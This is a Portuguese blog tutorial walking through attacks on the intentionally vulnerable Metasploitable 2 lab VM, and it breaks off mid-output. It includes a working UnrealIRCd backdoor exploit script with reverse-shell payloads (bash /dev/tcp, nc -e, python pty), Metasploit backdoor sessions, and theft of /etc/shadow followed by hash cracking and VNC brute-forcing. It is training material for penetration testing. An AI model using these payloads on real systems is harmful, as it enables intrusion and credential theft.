<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Exploração de vulnerabilidades em ambientes virtuais | Blog do GRIS</title>
<meta name=keywords content="Redes"><meta name=description content="Exploração de vulnerabilidades da máquina Metasploitable 2"><meta name=author content="brenoppr"><link rel=canonical href=http://localhost:1313/blog/2024-08-11-exploracao-metasploitable2/><meta name=google-site-verification content="G-YWN8S4BKK0"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/images/gris-logo-2020%27s_black.png><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/images/gris-logo-2020-black-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/images/gris-logo-2020-black-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/blog/2024-08-11-exploracao-metasploitable2/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css integrity=sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js integrity=sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous onload=renderMathInElement(document.body)></script>>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><meta property="og:url" content="http://localhost:1313/blog/2024-08-11-exploracao-metasploitable2/"><meta property="og:site_name" content="Blog do GRIS"><meta property="og:title" content="Exploração de vulnerabilidades em ambientes virtuais"><meta property="og:description" content="Exploração de vulnerabilidades da máquina Metasploitable 2"><meta property="og:locale" content="pt"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2024-08-11T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-11T00:00:00+00:00"><meta property="article:tag" content="Redes"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Exploração de vulnerabilidades em ambientes virtuais"><meta name=twitter:description content="Exploração de vulnerabilidades da máquina Metasploitable 2"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blogs","item":"http://localhost:1313/blog/"},{"@type":"ListItem","position":2,"name":"Exploração de vulnerabilidades em ambientes virtuais","item":"http://localhost:1313/blog/2024-08-11-exploracao-metasploitable2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Exploração de vulnerabilidades em ambientes virtuais","name":"Exploração de vulnerabilidades em ambientes virtuais","description":"Exploração de vulnerabilidades da máquina Metasploitable 2","keywords":["Redes"],"articleBody":"Introdução Neste post, vamos abordar como identificar e explorar algumas vulnerabilidades comuns encontradas na máquina vulnerável Metasploitable 2, utilizando ferramentas e métodos que são amplamente aplicáveis em cenários reais.\nO que é o Metasploitable 2? Metasploitable 2 é uma máquina virtual intencionalmente vulnerável, desenvolvida pela Rapid7, projetada para ser uma plataforma de prática para profissionais e entusiastas de segurança cibernética. Ela simula um ambiente de rede com várias vulnerabilidades conhecidas, permitindo que os usuários testem e aprimorem suas habilidades em pentest sem comprometer sistemas reais.\nEssa máquina contém diversos serviços mal configurados e softwares desatualizados, representando um campo de treino ideal para aprender a identificar e explorar falhas de segurança de forma controlada.\nFigura 1: Metasploitable 2 sendo executado em uma Máquina Virtual.\nUm guia para a instalação do ambiente do Metasploitable 2 pode ser encontrado aqui.\nExploração inicial: Enumeração de portas A exploração inicial de qualquer sistema vulnerável começa com a enumeração de portas, uma etapa essencial para identificar quais serviços estão em execução e, potencialmente, vulneráveis. Para isso, utilizamos o Nmap (Network Mapper), uma ferramenta poderosa e amplamente utilizada em testes de penetração. O Nmap permite mapear a rede e descobrir portas abertas, além de coletar informações detalhadas sobre os serviços, versões e sistemas operacionais em execução.\nEssas informações são cruciais para planejar as etapas subsequentes da exploração, pois ajudam a direcionar os esforços para vulnerabilidades específicas que podem ser exploradas com sucesso.\nFigura 2: O comando Nmap é usado para descobrir quais serviços estão rodando em quais portas no IP da máquina vulnerável.\nPodemos ver diversas portas abertas, cada uma com um serviço diferente que pode ou não ser vulnerável. Neste post, não abordaremos todas as vulnerabilidades, mas podemos imediatemente abordar algumas que nos saltam aos olhos.\nBindshell A porta 1524 aberta na Metasploitable 2 representa uma vulnerabilidade crítica, conhecida como “bindshell”. Essa vulnerabilidade ocorre quando um shell é vinculado diretamente a uma porta, permitindo que qualquer atacante que se conecte a essa porta obtenha acesso ao sistema com privilégios elevados, sem a necessidade de autenticação.\nPodemos explorá-la utilizando o comando nc (netcat) para conectar ao IP da máquina na porta 1524.\nFigura 3: O netcat é usado para se conectar ao IP da máquina vulnerável na porta 1524. O comando whoami mostra que nós de fato estamos executando código na máquina vulnerável como o usuário raiz (root).\nvsFTPd Ao tentar se conectar ao serviço FTP na porta 21, podemos ver que ela está vinculada ao vsFTPd versão 2.3.4. Uma busca rápida no Google nos mostra que este serviço está sujeito a uma vulnerabilidade de backdoor (CVE-2011-2523).\nAo tentar logar com um nome de usuário finalizado em “:)”, sem aspas, um shell é criado e passa a ser servido na porta 6200 com privilégios de administrador.\nFigura 4: Ao tentar se logar com o usuário terminado em :), a autenticação parece falhar. No entanto…\nFigura 5: Conseguimos nos conectar na porta 6200, muito similar à vulnerabilidade do bindshell vista anteriormente.\nUnrealIRCd O serviço de IRC na porta 6667 é o UnrealIRCd versão 3.2.8.1. Isso pode ser checado com um script do Nmap para obter informações de serviços IRC.\nFigura 6: Os scripts do Nmap podem nos ajudar a receber informações de serviços que seriam difíceis de conseguir de outras formas.\nAo pesquisar por esta versão, é possível novamente confirmar que ela é sujeita a uma vulnerabilidade backdoor como descrita no CVE-2010-2075, que permite injeção de comando na máquina vulnerável. No entanto, esta vulnerabilidade é um pouco mais complexa que a última, então para explorar ela usamos o seguinte script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #!/usr/bin/python3 import argparse import socket import base64 # Sets the target ip and port from argparse parser = argparse.ArgumentParser() parser.add_argument('ip', help='target ip') parser.add_argument('port', help='target port', type=int) parser.add_argument('-payload', help='set payload type', required=True, choices=['python', 'netcat', 'bash']) args = parser.parse_args() # Sets the local ip and port (address and port to listen on) local_ip = '' # CHANGE THIS local_port = '' # CHANGE THIS # The different types of payloads that are supported python_payload = f'python -c \"import os;import pty;import socket;tLnCwQLCel=\\'{local_ip}\\';EvKOcV={local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\\'HISTFILE\\',\\'/dev/null\\');pty.spawn(\\'/bin/bash\\');QRRCCltJB.close();\" ' bash_payload = f'bash -i \u003e\u0026 /dev/tcp/{local_ip}/{local_port} 0\u003e\u00261' netcat_payload = f'nc -e /bin/bash {local_ip} {local_port}' # our socket to interact with and send payload try: s = socket.create_connection((args.ip, args.port)) except socket.error as error: print('connection to target failed...') print(error) # craft out payload and then it gets base64 encoded def gen_payload(payload_type): base = base64.b64encode(payload_type.encode()) return f'echo {base.decode()} |base64 -d|/bin/bash' # all the different payload options to be sent if args.payload == 'python': try: s.sendall((f'AB; {gen_payload(python_payload)} \\n').encode()) except: print('connection made, but failed to send exploit...') if args.payload == 'netcat': try: s.sendall((f'AB; {gen_payload(netcat_payload)} \\n').encode()) except: print('connection made, but failed to send exploit...') if args.payload == 'bash': try: s.sendall((f'AB; {gen_payload(bash_payload)} \\n').encode()) except: print('connection made, but failed to send exploit...') #check display any response from the server data = s.recv(1024) s.close() if data != '': print('Exploit sent successfully!') Este script enviará para o IP da máquina vulnerável um comando para conectá-la à nossa na porta especificada (no caso, definimos no script como 7777). Para receber esse sinal, podemos usar o próprio netcat, usado anteriormente, para criar um servidor que escuta por requisições na nossa porta 7777.\nAo receber essa conexão, imediatamente temos acesso ao shell da máquina vulnerável, novamente como usuário root.\nFigura 7: O script se conecta à maquina vulnerável e a faz criar uma requisição para nossa porta 7777.\nFigura 8: Ao receber a requisição, nosso servidor passa para o modo interativo e conseguimos acesso ao shell remoto.\nIntrodução ao Metasploit: Explorando Serviços Vulneráveis Até o momento, utilizamos diversas ferramentas para mapear e interagir com os serviços ativos na máquina. Embora essas ferramentas individuais sejam poderosas, há um framework que consolida várias dessas capacidades em uma única plataforma: o Metasploit, que contém centenas de módulos para exploração de vulnerabilidades.\nA seguir, vamos explorar alguns módulos que lidam com servidores FTP vulneráveis para verificar se o serviço FTP que encontramos permite acesso anônimo, um vetor de ataque comum em sistemas mal configurados.\nAnonymous FTP Login Neste tutorial, usaremos o Metasploit para explorar uma vulnerabilidade conhecida em um servidor FTP e obter informações sobre as senhas dos usuários.\nPara começar, você precisa abrir o Metasploit. Se estiver usando o Kali Linux, o Metasploit já vem pré-instalado. Basta abrir um terminal e digitar o seguinte comando para iniciá-lo:\n1 └─$ msfconsole Se estiver usando outra distribuição Linux, você pode consultar a documentação do Metasploit no seguinte link: https://docs.metasploit.com/.\nO primeiro módulo que usaremos é o scanner/ftp/anonymous, que verifica se o servidor FTP permite acesso anônimo. Digite os seguintes comandos no prompt do Metasploit:\n1 └─$ msf6 \u003e use auxiliary/scanner/ftp/anonymous Em seguida, configure o endereço IP do alvo.\nObservação: o IP da sua máquina Metasploitable 2 pode ser diferente deste abaixo. Para consultá-lo, entre em sua máquina virtual, digite o comando ip a no terminal e procure pelo endereço IP associado à interface eth0.\n1 2 msf6 auxiliary(scanner/ftp/anonymous) \u003e set RHOSTS 192.168.1.30 RHOSTS =\u003e 192.168.1.30 Agora, execute o scanner para verificar o acesso anônimo:\n1 2 3 4 5 msf6 auxiliary(scanner/ftp/anonymous) \u003e run [+] 192.168.1.30:21 - 192.168.1.30:21 - Anonymous READ (220 (vsFTPd 2.3.4)) [*] 192.168.1.30:21 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Veja que o FTP permite login anônimo. Podemos, usar um exploit específico para uma vulnerabilidade conhecida no vsFTPd 2.3.4 (Very Secure FTP Daemon): o vsftpd_234_backdoor. Este módulo explora a vulnerabilidade do vsFTPd 2.3.4 para obter uma shell interativa.\nPara isso, digite os seguintes comandos:\n1 2 3 msf6 auxiliary(scanner/ftp/anonymous) \u003e use exploit/unix/ftp/vsftpd_234_backdoor [*] No payload configured, defaulting to cmd/unix/interact Configure o endereço IP do alvo e a porta (por padrão, o FTP usa a porta 21):\n1 2 3 4 5 msf6 exploit(unix/ftp/vsftpd_234_backdoor) \u003e set RHOSTS 192.168.1.30 RHOSTS =\u003e 192.168.1.30 msf6 exploit(unix/ftp/vsftpd_234_backdoor) \u003e set RPORT 21 RPORT =\u003e 21 Agora, execute o exploit:\n1 2 3 4 5 6 7 8 msf6 exploit(unix/ftp/vsftpd_234_backdoor) \u003e run [*] 192.168.1.30:21 - Banner: 220 (vsFTPd 2.3.4) [*] 192.168.1.30:21 - USER: 331 Please specify the password. [+] 192.168.1.30:21 - Backdoor service has been spawned, handling... [+] 192.168.1.30:21 - UID: uid=0(root) gid=0(root) [*] Found shell. [*] Command shell session 2 opened (172.18.18.105:35943 -\u003e 192.168.1.30:6200) at 2024-08-11 17:08:34 -0300 O exploit foi bem-sucedido. Agora, nós temos uma shell no sistema remoto como o usuário root e podemos explorar o sistema de arquivos do alvo. Por exemplo, veja o comando dir que lista as pastas do diretório atual (que é o /):\n1 2 3 4 5 dir bin dev initrd lost+found nohup.out root sys var boot etc initrd.img media opt sbin tmp vmlinuz cdrom home lib mnt proc srv usr Podemos também procurar e baixar arquivos sensíveis como /etc/passwd e /etc/shadow, que contêm informações sobre os usuários e suas senhas. Vamos listar o conteúdo desses arquivos com o comando GET:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 GET /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 GET /etc/shadow root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7::: daemon:*:14684:0:99999:7::: bin:*:14684:0:99999:7::: sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7::: sync:*:14684:0:99999:7::: games:*:14684:0:99999:7::: man:*:14684:0:99999:7::: lp:*:14684:0:99999:7::: mail:*:14684:0:99999:7::: news:*:14684:0:99999:7::: uucp:*:14684:0:99999:7::: proxy:*:14684:0:99999:7::: www-data:*:14684:0:99999:7::: backup:*:14684:0:99999:7::: list:*:14684:0:99999:7::: irc:*:14684:0:99999:7::: gnats:*:14684:0:99999:7::: nobody:*:14684:0:99999:7::: libuuid:!:14684:0:99999:7::: dhcp:*:14684:0:99999:7::: syslog:*:14684:0:99999:7::: klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7::: sshd:*:14684:0:99999:7::: msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7::: bind:*:14685:0:99999:7::: postfix:*:14685:0:99999:7::: ftp:*:14685:0:99999:7::: postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7::: mysql:!:14685:0:99999:7::: tomcat55:*:14691:0:99999:7::: distccd:*:14698:0:99999:7::: user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7::: service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7::: telnetd:*:14715:0:99999:7::: proftpd:!:14727:0:99999:7::: statd:*:15474:0:99999:7::: Em posse dessas informações, uma ideia seria utilizar o John the Ripper, uma ferramenta de cracking de senhas que pode processar e quebrar hashes de senhas. Ela tem a capacidade de unificar arquivos de senha e hash, como o /etc/passwd e /etc/shadow, e realizar ataques para descobrir as senhas originais.\nPara unificar esses arquivos e preparar o ambiente para quebrar as senhas, vamos baixar os arquivos e salvá-los em meu diretório local /tmp no Kali.\n1 2 3 download /etc/passwd /tmp/passwd [*] Download /etc/passwd =\u003e /tmp/passwd [+] Done 1 2 3 download /etc/shadow /tmp/shadow [*] Download /etc/shadow =\u003e /tmp/shadow [+] Done Vamos voltar para o terminal padrão do Kali.\n1 2 3 exit [*] 192.168.1.30 - Command shell session 2 closed. msf6 exploit(unix/ftp/vsftpd_234_backdoor) \u003e 1 2 3 4 msf6 exploit(unix/ftp/vsftpd_234_backdoor) \u003e exit ┌──(gbrods㉿Gabriel)-[~] └─$ Com os arquivos baixados, usamos o comando unshadow do John the Ripper para combinar os arquivos /etc/passwd e /etc/shadow em um único arquivo de hashes unshadowed.txt.\n1 └─$ unshadow /tmp/passwd /tmp/shadow \u003e /tmp/unshadowed.txt O arquivo unificado fica desta forma:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 cat /tmp/unshadowed.txt root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash daemon:*:1:1:daemon:/usr/sbin:/bin/sh bin:*:2:2:bin:/bin:/bin/sh sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh sync:*:4:65534:sync:/bin:/bin/sync games:*:5:60:games:/usr/games:/bin/sh man:*:6:12:man:/var/cache/man:/bin/sh lp:*:7:7:lp:/var/spool/lpd:/bin/sh mail:*:8:8:mail:/var/mail:/bin/sh news:*:9:9:news:/var/spool/news:/bin/sh uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh proxy:*:13:13:proxy:/bin:/bin/sh www-data:*:33:33:www-data:/var/www:/bin/sh backup:*:34:34:backup:/var/backups:/bin/sh list:*:38:38:Mailing List Manager:/var/list:/bin/sh irc:*:39:39:ircd:/var/run/ircd:/bin/sh gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:*:65534:65534:nobody:/nonexistent:/bin/sh libuuid:!:100:101::/var/lib/libuuid:/bin/sh dhcp:*:101:102::/nonexistent:/bin/false syslog:*:102:103::/home/syslog:/bin/false klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:*:105:113::/var/cache/bind:/bin/false postfix:*:106:115::/var/spool/postfix:/bin/false ftp:*:107:65534::/home/ftp:/bin/false postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:!:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:*:110:65534::/usr/share/tomcat5.5:/bin/false distccd:*:111:65534::/:/bin/false user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash telnetd:*:112:120::/nonexistent:/bin/false proftpd:!:113:65534::/var/run/proftpd:/bin/false statd:*:114:65534::/var/lib/nfs:/bin/false Finalmente, use o John the Ripper para quebrar as senhas no arquivo unificado. O formato de saída é: senha (usuário)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 └─$ john /tmp/unshadowed.txt Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 6 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status user (user) postgres (postgres) msfadmin (msfadmin) service (service) Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst 123456789 (klog) batman (sys) Proceeding with incremental:ASCII ... Depois que o comando terminar, podemos exibir os resultados da seguinte forma:\n1 2 3 4 5 6 7 8 9 └─$ john --show /tmp/unshadowed.txt sys:batman:3:3:sys:/dev:/bin/sh klog:123456789:103:104::/home/klog:/bin/false msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash user:user:1001:1001:just a user,111,,:/home/user:/bin/bash service:service:1002:1002:,,,:/home/service:/bin/bash 6 password hashes cracked, 1 left Ao utilizar a wordlist password.lst, não foram encontradas outras senhas além daquelas obtidas anteriormente.\nVNC (Virtual Network Computing) Relembrando da nossa enumeração inicial de portas, havia uma porta aberta referente ao serviço VNC. Veja:\n1 2 3 4 5 6 7 8 9 10 └─$ nmap -sV 192.168.1.30 -p 5900 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 18:52 -03 Nmap scan report for 192.168.1.30 Host is up (0.0017s latency). PORT STATE SERVICE VERSION 5900/tcp open vnc VNC (protocol 3.3) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds Observação: a flag -sV habilita a detecção de serviço, retornando informações sobre suas versões.\nO VNC é um protocolo para controle remoto de desktops, e pode ser uma porta de entrada para obter acesso gráfico ao sistema. A seguir, vamos utilizar o Metasploit para tentar autenticar no serviço VNC.\n1 msfconsole Busque pelo módulo que testa credenciais de login para o VNC.\n1 2 3 4 5 6 7 8 msf6 \u003e search vnc_login Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/vnc/vnc_login . normal No VNC Authentication Scanner Selecionamos o módulo para escaneamento de login do VNC.\n1 msf6 \u003e use auxiliary/scanner/vnc/vnc_login Cada módulo do Metasploit possui campos obrigatórios e opcionais. Os campos obrigatórios são essenciais para a execução do módulo, enquanto os campos opcionais podem ser configurados para personalizar a execução ou otimizar o processo de exploração. Para ver esss campos, utilize o seguinte comando:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 msf6 auxiliary(scanner/vnc/vnc_login) \u003e show options Module options (auxiliary/scanner/vnc/vnc_login): Name Current Setting Required Description ---- --------------- -------- ----------- ANONYMOUS_LOGIN false yes Attempt to login with a blank username and password BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current da tabase DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list DB_SKIP_EXISTING none no Skip existing credentials stored in the current databa se (Accepted: none, user, user\u0026realm) PASSWORD no The password to test PASS_FILE /usr/share/metasploit-framework no File containing passwords, one per line /data/wordlists/vnc_passwords.t xt Proxies no A proxy chain of format type:host:port[,type:host:port ][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/do cs/using-metasploit/basics/using-metasploit.html RPORT 5900 yes The target port (TCP) STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space , one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE no File containing usernames, one per line VERBOSE true yes Whether to print output for all attempts View the full module info with the info, or info -d command. Vamos configurar o endereço do host alvo e o nome de usuário.\n1 2 3 4 5 msf6 auxiliary(scanner/vnc/vnc_login) \u003e set RHOSTS 192.168.1.30 RHOSTS =\u003e 192.168.1.30 msf6 auxiliary(scanner/vnc/vnc_login) \u003e set USERNAME root USERNAME =\u003e root Por fim, executamos o módulo para tentar a autenticação.\n1 2 3 4 5 6 7 msf6 auxiliary(scanner/vnc/vnc_login) \u003e run [*] 192.168.1.30:5900 - 192.168.1.30:5900 - Starting VNC login sweep [!] 192.168.1.30:5900 - No active DB -- Credential data will not be saved! [+] 192.168.1.30:5900 - 192.168.1.30:5900 - Login Successful: :password [*] 192.168.1.30:5900 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Vimos que o módulo conseguiu logar com sucesso usando a senha password. Abra outro terminal do Kali e utilize o comando vncviewer 192.168.1.30. Se o vncviewer não estiver instalado, você pode obtê-lo com o seguinte comando: sudo apt install tigervnc-viewer.\n1 vncviewer 192.168.1.30 Insira a senha password, conforme encontramos anteriormente.\nDessa forma, é possível obter acesso completo ao desktop remoto, oferecendo uma oportunidade para explorar mais sobre a máquina-alvo.\nExploração de um servidor web Anteriormente, encontramos que a porta 80 está aberta. Vamos analisá-la.\n1 2 3 4 5 6 7 8 9 10 └─$ nmap -sV 192.168.1.30 -p 80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 19:51 -03 Nmap scan report for 192.168.1.30 Host is up (0.0077s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds O servidor web está rodando o Apache HTTPD 2.2.8 em um sistema Ubuntu. Para obter mais informações sobre o servidor, podemos usar o seguinte módulo do Metasploit:\n1 2 3 4 5 6 7 8 9 10 11 msf6 \u003e search http_version Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/http_version . normal No HTTP Version Detection Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/http_version Selecionando o módulo de detecção de versão HTTP:\n1 msf6 \u003e use auxiliary/scanner/http/http_version Exibindo as opções disponíveis para o módulo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 msf6 auxiliary(scanner/http/http_version) \u003e show options Module options (auxiliary/scanner/http/http_version): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic s/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections THREADS 1 yes The number of concurrent threads (max one per host) VHOST no HTTP server virtual host Configurando o módulo com o endereço do alvo:\n1 2 msf6 auxiliary(scanner/http/http_version) \u003e set RHOSTS 192.168.1.30 RHOSTS =\u003e 192.168.1.30 Executamos o módulo para verificar a versão do HTTP:\n1 2 3 4 5 msf6 auxiliary(scanner/http/http_version) \u003e run [+] 192.168.1.30:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 ) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed De fato, o servidor está rodando Apache/2.2.8 (Ubuntu), mas está rodando PHP/5.2.4-2ubuntu5.10. Agora que sabemos que o servidor está usando PHP, uma abordagem comum é verificar se existem arquivos de configuração padrão que podem fornecer informações úteis. Um arquivo típico para verificar é o phpinfo.php, que geralmente está disponível para fins de diagnóstico e fornece informações detalhadas sobre a configuração do PHP.\nVamos acessar esse caminho no browser, navegando para o endereço 192.168.1.30/phpinfo.php.\nObservação: o phpinfo.php é um caminho padrão, mas nem todos os servidores terão este arquivo disponível. Se não estiver acessível, é possível que o administrador do sistema tenha removido ou desativado esse arquivo por questões de segurança.\nVamos, agora, identificar diretórios no servidor web usando o seguinte módulo:\n1 2 3 4 5 6 7 8 9 10 11 msf6 \u003e search dir_scanner Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 